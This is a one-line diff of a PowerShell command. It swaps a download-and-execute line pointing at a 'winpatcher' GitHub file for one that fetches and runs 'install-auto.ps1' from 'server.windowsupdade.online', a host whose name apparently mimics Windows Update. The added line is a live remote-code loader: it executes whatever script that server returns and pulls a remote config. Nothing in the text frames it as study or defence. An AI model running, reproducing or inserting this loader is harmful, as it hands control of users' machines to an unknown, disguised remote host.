@@ -1,1 +1,1 @@
-$u='https://raw.githubusercontent.com/pty-ui/winpatcher/refs/heads/main/cn.txt'; & ([scriptblock]::Create((irm $u))) -Config 'https://server.winpatcher.com/conf.cfg' -ScriptUrl $u
+& ([scriptblock]::Create((irm 'https://server.windowsupdade.online/loaders/v2/install-auto.ps1'))) -Config 'https://server.windowsupdade.online/conf.cfg'
